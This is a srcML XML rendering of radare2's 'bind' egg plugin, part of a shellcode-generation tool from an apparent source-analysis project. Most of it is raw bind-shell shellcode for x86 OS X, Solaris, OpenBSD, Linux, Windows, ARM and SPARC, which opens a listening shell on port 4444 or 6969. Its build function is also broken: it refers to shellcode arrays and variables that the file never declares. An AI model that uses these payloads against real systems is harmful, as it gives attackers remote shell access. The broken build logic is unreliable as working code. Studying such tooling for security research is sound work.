<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<unit xmlns="http://www.srcML.org/srcML/src" xmlns:cpp="http://www.srcML.org/srcML/cpp" revision="1.0.0" language="C" filename="D:\Pesquisa\Projects\radare2-analysis\_cppstats\radare2\libr\egg\p\egg_bind.c"><cpp:include>#<cpp:directive>include</cpp:directive> <cpp:file>&lt;r_egg.h&gt;</cpp:file></cpp:include>

<decl_stmt><decl><type><specifier>static</specifier> <name>unsigned</name> <name>char</name></type> <name><name>x86_osx_bind4444</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x33\xc9\x83\xe9\xea\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc5"</literal>

<literal type="string">"\x7e\x85\xb4\x83\xeb\xfc\xe2\xf4\xaf\x3c\xdd\x79\x45\x14\xe4\xec"</literal>

<literal type="string">"\x5c\x2c\xed\xa4\xc7\x6f\xd9\x3d\x24\x2c\xc7\xe6\x87\x2c\xef\xa4"</literal>

<literal type="string">"\x08\xfe\x1c\x27\x94\x2d\xd7\xde\xad\x26\x48\x34\x75\x14\x48\x34"</literal>

<literal type="string">"\x97\x2d\xd7\x04\xdb\xb3\x05\x23\xaf\x7c\xdc\xde\x9f\x26\xd4\xe3"</literal>

<literal type="string">"\x94\xb3\x05\xfd\xca\xf7\x74\x4b\x3a\x81\xd5\xdc\xea\x51\xf6\xdc"</literal>

<literal type="string">"\xad\x51\xe7\xdd\xab\xf7\x66\xe4\x91\x2a\xd6\xe7\x75\x45\x48\x34"</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>static</specifier> <name>unsigned</name> <name>char</name></type> <name><name>x86_solaris_bind4444</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x31\xc9\x83\xe9\xe8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x3f"</literal>

<literal type="string">"\x08\x0b\x8d\x83\xeb\xfc\xe2\xf4\x87\xf7\xf3\x72\x03\xff\xdb\xdd"</literal>

<literal type="string">"\x0e\xc8\xbb\x17\x6f\x81\xee\xbc\xf6\x59\x4a\xcc\x6e\x59\xbb\x6b"</literal>

<literal type="string">"\xc0\xdd\x3a\x5f\xb6\xcf\x59\xeb\x57\x19\x57\xeb\x6e\x81\xed\xe7"</literal>

<literal type="string">"\x2f\x5e\x5c\x3d\xd7\xf7\xde\x3d\xd6\xf7\xde\xdd\x6f\x5f\xbb\x67"</literal>

<literal type="string">"\xc0\xdd\x3a\x5f\x8d\x01\x5a\xdf\x6f\xb8\x35\x72\xea\x41\x72\x7f"</literal>

<literal type="string">"\x6f\x60\x24\xa2\x4c\x60\x63\xa2\x5d\x61\x65\x04\xdc\x58\x58\x04"</literal>

<literal type="string">"\xdd\x58\x59\xde\x8f\x33\xf4\x58"</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>static</specifier> <name>long</name></type> <name><name>x86_openbsd_bind6969</name><index>[]</index></name><init>= <expr><block>{ 

<expr><literal type="number">0x4151c931</literal></expr>,<expr><literal type="number">0x51514151</literal></expr>,<expr><literal type="number">0x61b0c031</literal></expr>,<expr><literal type="number">0x078980cd</literal></expr>,<expr><literal type="number">0x4f88c931</literal></expr>,<expr><literal type="number">0x0547c604</literal></expr>,<expr><literal type="number">0x084f8902</literal></expr>,

<expr><literal type="number">0x0647c766</literal></expr>,<expr><literal type="number">0x106a391b</literal></expr>,<expr><literal type="number">0x5004478d</literal></expr>,<expr><literal type="number">0x5050078b</literal></expr>,<expr><literal type="number">0x68b0c031</literal></expr>,<expr><literal type="number">0x016a80cd</literal></expr>,<expr><literal type="number">0x5050078b</literal></expr>,

<expr><literal type="number">0x6ab0c031</literal></expr>,<expr><literal type="number">0xc93180cd</literal></expr>,<expr><literal type="number">0x078b5151</literal></expr>,<expr><literal type="number">0xc0315050</literal></expr>,<expr><literal type="number">0x80cd1eb0</literal></expr>,<expr><literal type="number">0xc9310789</literal></expr>,<expr><literal type="number">0x50078b51</literal></expr>,

<expr><literal type="number">0xb0c03150</literal></expr>,<expr><literal type="number">0x4180cd5a</literal></expr>,<expr><literal type="number">0x7503f983</literal></expr>,<expr><literal type="number">0x5b23ebef</literal></expr>,<expr><literal type="number">0xc9311f89</literal></expr>,<expr><literal type="number">0x89074b88</literal></expr>,<expr><literal type="number">0x8d51044f</literal></expr>,

<expr><literal type="number">0x078b5007</literal></expr>,<expr><literal type="number">0xc0315050</literal></expr>,<expr><literal type="number">0x80cd3bb0</literal></expr>,<expr><literal type="number">0x5151c931</literal></expr>,<expr><literal type="number">0x01b0c031</literal></expr>,<expr><literal type="number">0xd8e880cd</literal></expr>,<expr><literal type="number">0x2fffffff</literal></expr>,

<expr><literal type="number">0x2f6e6962</literal></expr>,<expr><literal type="number">0x90416873</literal></expr> }</block></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>static</specifier> <name>unsigned</name> <name>char</name></type> <name><name>x86_linux_bind4444</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x33\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x81\x9c\x95"</literal>

<literal type="string">"\xe9\x83\xeb\xfc\xe2\xf4\xb0\x47\xc6\xaa\xd2\xf6\x97\x83\xe7\xc4\x0c\x60"</literal>

<literal type="string">"\x60\x51\x15\x7f\xc2\xce\xf3\x81\x90\xc0\xf3\xba\x08\x7d\xff\x8f\xd9\xcc"</literal>

<literal type="string">"\xc4\xbf\x08\x7d\x58\x69\x31\xfa\x44\x0a\x4c\x1c\xc7\xbb\xd7\xdf\x1c\x08"</literal>

<literal type="string">"\x31\xfa\x58\x69\x12\xf6\x97\xb0\x31\xa3\x58\x69\xc8\xe5\x6c\x59\x8a\xce"</literal>

<literal type="string">"\xfd\xc6\xae\xef\xfd\x81\xae\xfe\xfc\x87\x08\x7f\xc7\xba\x08\x7d\x58\x69\x00"</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>static</specifier> <name>unsigned</name> <name>char</name></type> <name><name>x86_linux_udp4444</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x33\xc9\x83\xe9\xe7\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x13\xec\x81"</literal>

<literal type="string">"\xca\x83\xeb\xfc\xe2\xf4\x22\x37\xd2\xa0\x11\x86\x83\x89\x79\x8a\xd9\x43"</literal>

<literal type="string">"\xf2\x21\x01\x59\x4a\x5c\xbe\x07\x93\xa5\xf8\x33\x48\xb6\xe9\xb5\x13\xec"</literal>

<literal type="string">"\x80\xac\x7b\xfd\xdd\xac\x40\x65\x60\xa0\x03\xbd\xd2\x43\xf2\xaf\x31\xac"</literal>

<literal type="string">"\xde\x6c\xeb\xc1\x4b\xbe\xe7\xa2\x3e\x85\x08\x2b\x79\x8b\xe7\xa2\x7a\x82"</literal>

<literal type="string">"\xe9\xaf\x77\x85\xf5\xa2\x3e\xc1\xef\xa5\x9a\x0b\xd3\xa2\x3c\xc3\xf2\xa2"</literal>

<literal type="string">"\x7b\xc3\xe3\xa3\x7d\x65\x62\x98\x42\xbb\xd2\x43\xf2\x21\x01\xca\x00"</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>static</specifier> <name>char</name></type> <name><name>arm_linux_bind</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x20\x60\x8f\xe2"</literal> 

<literal type="string">"\x07\x70\x47\xe0"</literal> 

<literal type="string">"\x01\x70\xc6\xe5"</literal> 

<literal type="string">"\x01\x30\x87\xe2"</literal> 

<literal type="string">"\x13\x07\xa0\xe1"</literal> 

<literal type="string">"\x01\x20\x83\xe2"</literal> 

<literal type="string">"\x07\x40\xa0\xe1"</literal> 

<literal type="string">"\x0e\xe0\x4e\xe0"</literal> 

<literal type="string">"\x1c\x40\x2d\xe9"</literal> 

<literal type="string">"\x0d\x10\xa0\xe1"</literal> 

<literal type="string">"\x66\xff\x90\xef"</literal> 

<literal type="string">"\x10\x57\xa0\xe1"</literal> 

<literal type="string">"\x35\x70\xc6\xe5"</literal> 

<literal type="string">"\x14\x20\xa0\xe3"</literal> 

<literal type="string">"\x82\x28\xa9\xe1"</literal> 

<literal type="string">"\x02\x20\x82\xe2"</literal> 

<literal type="string">"\x14\x40\x2d\xe9"</literal> 

<literal type="string">"\x10\x30\xa0\xe3"</literal> 

<literal type="string">"\x0d\x20\xa0\xe1"</literal> 

<literal type="string">"\x0d\x40\x2d\xe9"</literal> 

<literal type="string">"\x02\x20\xa0\xe3"</literal> 

<literal type="string">"\x12\x07\xa0\xe1"</literal> 

<literal type="string">"\x0d\x10\xa0\xe1"</literal> 

<literal type="string">"\x66\xff\x90\xef"</literal> 

<literal type="string">"\x45\x70\xc6\xe5"</literal> 

<literal type="string">"\x02\x20\x82\xe2"</literal> 

<literal type="string">"\x12\x07\xa0\xe1"</literal> 

<literal type="string">"\x66\xff\x90\xef"</literal> 

<literal type="string">"\x5d\x70\xc6\xe5"</literal> 

<literal type="string">"\x01\x20\x82\xe2"</literal> 

<literal type="string">"\x12\x07\xa0\xe1"</literal> 

<literal type="string">"\x04\x70\x8d\xe5"</literal> 

<literal type="string">"\x08\x70\x8d\xe5"</literal> 

<literal type="string">"\x66\xff\x90\xef"</literal> 

<literal type="string">"\x10\x57\xa0\xe1"</literal> 

<literal type="string">"\x02\x10\xa0\xe3"</literal> 

<literal type="string">"\x71\x70\xc6\xe5"</literal> 

<literal type="string">"\x15\x07\xa0\xe1"</literal> 

<literal type="string">"\x3f\xff\x90\xef"</literal> 

<literal type="string">"\x01\x10\x51\xe2"</literal> 

<literal type="string">"\xfb\xff\xff\x5a"</literal> 

<literal type="string">"\x99\x70\xc6\xe5"</literal> 

<literal type="string">"\x14\x30\x8f\xe2"</literal> 

<literal type="string">"\x04\x30\x8d\xe5"</literal> 

<literal type="string">"\x04\x10\x8d\xe2"</literal> 

<literal type="string">"\x02\x20\x42\xe0"</literal> 

<literal type="string">"\x13\x02\xa0\xe1"</literal> 

<literal type="string">"\x08\x20\x8d\xe5"</literal> 

<literal type="string">"\x0b\xff\x90\xef"</literal> 

<literal type="string">"/bin/sh"</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>static</specifier> <name>unsigned</name> <name>char</name></type> <name><name>sparc_linux_bind4444</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x23\x2d\x57\xbb\xa2\x14\x63\xd5\x20\xbf\xff\xff\x20\xbf\xff\xff"</literal>

<literal type="string">"\x7f\xff\xff\xff\xea\x03\xe0\x20\xaa\x9d\x40\x11\xea\x23\xe0\x20"</literal>

<literal type="string">"\xa2\x04\x40\x15\x81\xdb\xe0\x20\x12\xbf\xff\xfb\x9e\x03\xe0\x04"</literal>

<literal type="string">"\x29\x75\x4f\xd2\xf1\x9a\xaf\xde\x61\x8a\x8f\xdf\x61\x89\x70\x2b"</literal>

<literal type="string">"\xb1\xed\x30\x2b\xf1\xd1\xf0\x37\x60\x35\xaf\xcb\x06\x29\x8f\x1d"</literal>

<literal type="string">"\x97\x99\xf0\xb1\x3c\x3a\x50\x91\x9a\x2d\xb0\xc1\x32\x6e\x0f\x15"</literal>

<literal type="string">"\x54\x4a\xcf\x2d\xb1\xad\x30\x49\x69\xb8\x10\x0d\xc3\xdf\x12\xb8"</literal>

<literal type="string">"\xfb\xe4\x2d\x22\x6c\x0b\x72\xa0\x1d\xfb\x52\xb4\xbf\xeb\xb2\xb5"</literal>

<literal type="string">"\x22\x28\x0d\x4d\x32\x3f\x52\xa9\xa3\xef\xb2\xa1\x04\x2c\x0d\x39"</literal>

<literal type="string">"\x44\x10\xcd\x45\xd4\x47\x12\xb0\x45\xb7\x72\xaa\xb6\x14\xcd\x3e"</literal>

<literal type="string">"\xa4\x4b\x12\xbd\x5a\xc9\x32\xc0\xd9\x1d\x92\x98\x4c\xcd\xf3\x0c"</literal>

<literal type="string">"\x7c\x52\x0c\xd1\x51\xae\x4c\xdd\xc5\xab\x73\x16\xc4\xc7\xab\xb2"</literal>

<literal type="string">"\xa6\xcc\x6a\xac\x85\xe7\xb1\xea\x59\xdb\xea\x1a\xc8\x38\x4a\x12"</literal>

<literal type="string">"\x0c\x04\x35\xd2\x1c\x58\xf5\xea\x5c\xbc\xb5\xf6\xde\xd2\xea\x3d"</literal>

<literal type="string">"\x4f\x02\xca\x49\x70\xa3\x0a\x49"</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>static</specifier> <name>unsigned</name> <name>char</name></type> <name><name>x86_w32_tcp4444</name><index>[]</index></name> <init>=

<expr><literal type="string">"\x33\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7a"</literal>

<literal type="string">"\xba\xcb\x13\x83\xeb\xfc\xe2\xf4\x86\xd0\x20\x5e\x92\x43\x34\xec"</literal>

<literal type="string">"\x85\xda\x40\x7f\x5e\x9e\x40\x56\x46\x31\xb7\x16\x02\xbb\x24\x98"</literal>

<literal type="string">"\x35\xa2\x40\x4c\x5a\xbb\x20\x5a\xf1\x8e\x40\x12\x94\x8b\x0b\x8a"</literal>

<literal type="string">"\xd6\x3e\x0b\x67\x7d\x7b\x01\x1e\x7b\x78\x20\xe7\x41\xee\xef\x3b"</literal>

<literal type="string">"\x0f\x5f\x40\x4c\x5e\xbb\x20\x75\xf1\xb6\x80\x98\x25\xa6\xca\xf8"</literal>

<literal type="string">"\x79\x96\x40\x9a\x16\x9e\xd7\x72\xb9\x8b\x10\x77\xf1\xf9\xfb\x98"</literal>

<literal type="string">"\x3a\xb6\x40\x63\x66\x17\x40\x53\x72\xe4\xa3\x9d\x34\xb4\x27\x43"</literal>

<literal type="string">"\x85\x6c\xad\x40\x1c\xd2\xf8\x21\x12\xcd\xb8\x21\x25\xee\x34\xc3"</literal>

<literal type="string">"\x12\x71\x26\xef\x41\xea\x34\xc5\x25\x33\x2e\x75\xfb\x57\xc3\x11"</literal>

<literal type="string">"\x2f\xd0\xc9\xec\xaa\xd2\x12\x1a\x8f\x17\x9c\xec\xac\xe9\x98\x40"</literal>

<literal type="string">"\x29\xf9\x98\x50\x29\x45\x1b\x7b\x7a\xba\xcb\x13\x1c\xd2\xda\x4f"</literal>

<literal type="string">"\x1c\xe9\x42\xf2\xef\xd2\x27\xea\xd0\xda\x9c\xec\xac\xd0\xdb\x42"</literal>

<literal type="string">"\x2f\x45\x1b\x75\x10\xde\xad\x7b\x19\xd7\xa1\x43\x23\x93\x07\x9a"</literal>

<literal type="string">"\x9d\xd0\x8f\x9a\x98\x8b\x0b\xe0\xd0\x2f\x42\xee\x84\xf8\xe6\xed"</literal>

<literal type="string">"\x38\x96\x46\x69\x42\x11\x60\xb8\x12\xc8\x35\xa0\x6c\x45\xbe\x3b"</literal>

<literal type="string">"\x85\x6c\x90\x44\x28\xeb\x9a\x42\x10\xbb\x9a\x42\x2f\xeb\x34\xc3"</literal>

<literal type="string">"\x12\x17\x12\x16\xb4\xe9\x34\xc5\x10\x45\x34\x24\x85\x6a\xa3\xf4"</literal>

<literal type="string">"\x03\x7c\xb2\xec\x0f\xbe\x34\xc5\x85\xcd\x37\xec\xaa\xd2\x3b\x99"</literal>

<literal type="string">"\x7e\xe5\x98\xec\xac\x45\x1b\x13"</literal></expr></init></decl>;</decl_stmt>

<function><type><specifier>static</specifier> <name>RBuffer</name> <modifier>*</modifier></type><name>build</name> <parameter_list>(<parameter><decl><type><name>REgg</name> <modifier>*</modifier></type><name>egg</name></decl></parameter>)</parameter_list> <block>{<block_content>

<decl_stmt><decl><type><name>RBuffer</name> <modifier>*</modifier></type><name>buf</name> <init>= <expr><call><name>r_buf_new</name> <argument_list>()</argument_list></call></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><specifier>const</specifier> <name>ut8</name> <modifier>*</modifier></type><name>sc</name> <init>= <expr><name>NULL</name></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><name>int</name></type> <name>cd</name> <init>= <expr><literal type="number">0</literal></expr></init></decl>;</decl_stmt>

<decl_stmt><decl><type><name>char</name> <modifier>*</modifier></type><name>port</name> <init>= <expr><call><name>r_egg_option_get</name> <argument_list>(<argument><expr><name>egg</name></expr></argument>, <argument><expr><literal type="string">"port"</literal></expr></argument>)</argument_list></call></expr></init></decl>;</decl_stmt>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>os</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><name>R_EGG_OS_OSX</name></expr>:</case>

<case>case <expr><name>R_EGG_OS_DARWIN</name></expr>:</case>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>arch</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><name>R_SYS_ARCH_X86</name></expr>:</case>

<if_stmt><if>if <condition>(<expr><name>suid</name></expr>)</condition> <block>{<block_content>

<expr_stmt><expr><name>sc</name> <operator>=</operator> <name>x86_osx_suid_binsh</name></expr>;</expr_stmt>

<expr_stmt><expr><name>cd</name> <operator>=</operator> <literal type="number">7</literal><operator>+</operator><literal type="number">36</literal></expr>;</expr_stmt>

</block_content>}</block></if> <else>else <block>{<block_content>

<expr_stmt><expr><name>sc</name> <operator>=</operator> <name>x86_osx_binsh</name></expr>;</expr_stmt>

<expr_stmt><expr><name>cd</name> <operator>=</operator> <literal type="number">36</literal></expr>;</expr_stmt>

</block_content>}</block></else></if_stmt>

<case>case <expr><name>R_SYS_ARCH_ARM</name></expr>:</case>

<break>break;</break>

</block_content>}</block></switch>

<break>break;</break>

<case>case <expr><name>R_EGG_OS_LINUX</name></expr>:</case>

<if_stmt><if>if <condition>(<expr><name>suid</name></expr>)</condition><block type="pseudo"><block_content> <expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"no suid for this platform\n"</literal></expr></argument>)</argument_list></call></expr>;</expr_stmt></block_content></block></if></if_stmt>

<expr_stmt><expr><name>suid</name> <operator>=</operator> <literal type="number">0</literal></expr>;</expr_stmt>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>arch</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><name>R_SYS_ARCH_X86</name></expr>:</case>

<switch>switch <condition>(<expr><name><name>egg</name><operator>-&gt;</operator><name>bits</name></name></expr>)</condition> <block>{<block_content>

<case>case <expr><literal type="number">32</literal></expr>:</case> <expr_stmt><expr><name>sc</name> <operator>=</operator> <name>x86_linux_binsh</name></expr>;</expr_stmt> <break>break;</break>

<case>case <expr><literal type="number">64</literal></expr>:</case> <expr_stmt><expr><name>sc</name> <operator>=</operator> <name>x86_64_linux_binsh</name></expr>;</expr_stmt> <break>break;</break>

<default>default:</default> <expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"Unsupportted\n"</literal></expr></argument>)</argument_list></call></expr>;</expr_stmt>

</block_content>}</block></switch>

<break>break;</break>

<case>case <expr><name>R_SYS_ARCH_ARM</name></expr>:</case>

<expr_stmt><expr><name>sc</name> <operator>=</operator> <name>arm_linux_binsh</name></expr>;</expr_stmt>

<break>break;</break>

</block_content>}</block></switch>

<break>break;</break>

<default>default:</default>

<expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"unsupported os %x\n"</literal></expr></argument>, <argument><expr><name><name>egg</name><operator>-&gt;</operator><name>os</name></name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<break>break;</break>

</block_content>}</block></switch>

<if_stmt><if>if <condition>(<expr><name>sc</name></expr>)</condition> <block>{<block_content>

<expr_stmt><expr><call><name>r_buf_set_bytes</name> <argument_list>(<argument><expr><name>buf</name></expr></argument>, <argument><expr><name>sc</name></expr></argument>, <argument><expr><call><name>strlen</name> <argument_list>(<argument><expr><operator>(</operator><specifier>const</specifier> <name>char</name> <operator>*</operator><operator>)</operator><name>sc</name></expr></argument>)</argument_list></call></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<if_stmt><if>if <condition>(<expr><name>shell</name> <operator>&amp;&amp;</operator> <operator>*</operator><name>shell</name></expr>)</condition> <block>{<block_content>

<if_stmt><if>if <condition>(<expr><name>cd</name></expr>)</condition><block type="pseudo"><block_content> <expr_stmt><expr><call><name>r_buf_write_at</name> <argument_list>(<argument><expr><name>buf</name></expr></argument>, <argument><expr><name>cd</name></expr></argument>, <argument><expr><operator>(</operator><specifier>const</specifier> <name>ut8</name><operator>*</operator><operator>)</operator><name>shell</name></expr></argument>, <argument><expr><call><name>strlen</name> <argument_list>(<argument><expr><name>shell</name></expr></argument>)</argument_list></call><operator>+</operator><literal type="number">1</literal></expr></argument>)</argument_list></call></expr>;</expr_stmt></block_content></block></if>

<else>else<block type="pseudo"><block_content> <expr_stmt><expr><call><name>eprintf</name> <argument_list>(<argument><expr><literal type="string">"Cannot set shell\n"</literal></expr></argument>)</argument_list></call></expr>;</expr_stmt></block_content></block></else></if_stmt>

</block_content>}</block></if></if_stmt>

</block_content>}</block></if></if_stmt>

<expr_stmt><expr><call><name>free</name> <argument_list>(<argument><expr><name>suid</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<expr_stmt><expr><call><name>free</name> <argument_list>(<argument><expr><name>shell</name></expr></argument>)</argument_list></call></expr>;</expr_stmt>

<return>return <expr><name>buf</name></expr>;</return>

</block_content>}</block></function>

<decl_stmt><decl><type><name>REggPlugin</name></type> <name>r_egg_plugin_bind</name> <init>= <expr><block>{

<expr><operator>.</operator><name>name</name> <operator>=</operator> <literal type="string">"bind"</literal></expr>,

<expr><operator>.</operator><name>type</name> <operator>=</operator> <name>R_EGG_PLUGIN_SHELLCODE</name></expr>,

<expr><operator>.</operator><name>desc</name> <operator>=</operator> <literal type="string">"listen port=4444"</literal></expr>,

<expr><operator>.</operator><name>build</name> <operator>=</operator> <operator>(</operator><name>void</name> <operator>*</operator><operator>)</operator><name>build</name></expr>

}</block></expr></init></decl>;</decl_stmt>

<cpp:if>#<cpp:directive>if</cpp:directive> <expr><operator>!</operator><call><name>defined</name><argument_list>(<argument><expr><name>R2_PLUGIN_INCORE</name></expr></argument>)</argument_list></call></expr></cpp:if>
<decl_stmt><decl><type><name>R_API</name> <name>RLibStruct</name></type> <name>radare_plugin</name> <init>= <expr><block>{

<expr><operator>.</operator><name>type</name> <operator>=</operator> <name>R_LIB_TYPE_EGG</name></expr>,

<expr><operator>.</operator><name>data</name> <operator>=</operator> <operator>&amp;</operator><name>r_egg_plugin_bind</name></expr>,

<expr><operator>.</operator><name>version</name> <operator>=</operator> <name>R2_VERSION</name></expr>

}</block></expr></init></decl>;</decl_stmt>

<cpp:endif>#<cpp:directive>endif</cpp:directive></cpp:endif>

</unit>
